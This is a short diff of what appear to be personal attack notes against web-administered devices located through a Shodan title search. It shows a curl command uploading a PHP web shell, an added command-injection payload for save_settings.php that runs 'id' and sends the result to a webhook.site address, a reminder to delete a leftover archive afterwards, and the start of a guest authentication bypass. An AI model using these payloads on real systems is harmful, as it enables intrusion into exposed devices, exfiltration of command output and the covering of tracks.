@@ -9,6 +9,11 @@ shodan : title:"Remote Device Login"
 curl -F "file=@/tmp/shell.php" http://xxx/upload_file.php
 shell uploaded to http://xxx/upload/shell.php
 
+**** RCE via command injection ****
+
+/save_settings.php?name=1 $(curl http://webhook.site/xx/$(id))
+
+need to clean /var/www/settings/1.tgz after
 
 **** Auth bypasss as guest ****
 Set Cookie
